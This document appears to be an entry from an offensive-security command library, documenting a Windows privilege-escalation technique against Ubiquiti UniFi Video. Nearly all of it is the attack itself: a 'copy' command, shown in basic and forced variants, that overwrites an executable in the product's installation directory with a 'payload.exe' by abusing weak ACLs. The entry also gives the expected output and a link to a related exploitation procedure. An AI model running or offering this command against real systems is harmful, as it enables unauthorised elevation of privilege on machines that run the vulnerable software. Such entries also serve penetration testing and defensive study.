---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: 'copy payload.exe "C:\\Program Files\\Ubiquiti UniFi Video\\bin\\target.exe"'
tags:
  - file-modification
  - escalation
type: command
output: 1 file(s) copied.
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:28:44.482Z'
verified: false
validated: true
submitted: true
---
# copy-replace-file

## Command

```cmd
copy payload.exe "C:\Program Files\Ubiquiti UniFi Video\bin\target.exe"
```

## Description

Copies a source file (e.g., malicious payload) to overwrite a target executable in a protected directory, exploiting weak ACLs for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| source | Path to payload file | Yes |
| destination | Target file path in installation directory | Yes |

## Examples

### Basic Usage

```cmd
copy payload.exe "C:\Program Files\Ubiquiti UniFi Video\bin\target.exe"
```

### Advanced Usage

```cmd
copy /y payload.exe "C:\Program Files\Ubiquiti UniFi Video\bin\target.exe"
```

## Expected Output

1 file(s) copied.

No access denied errors confirm successful overwrite.

## Related

- [[Related Procedure|procedures/Exploit-Weak-ACLs-in-UniFi-Video-Directory]]
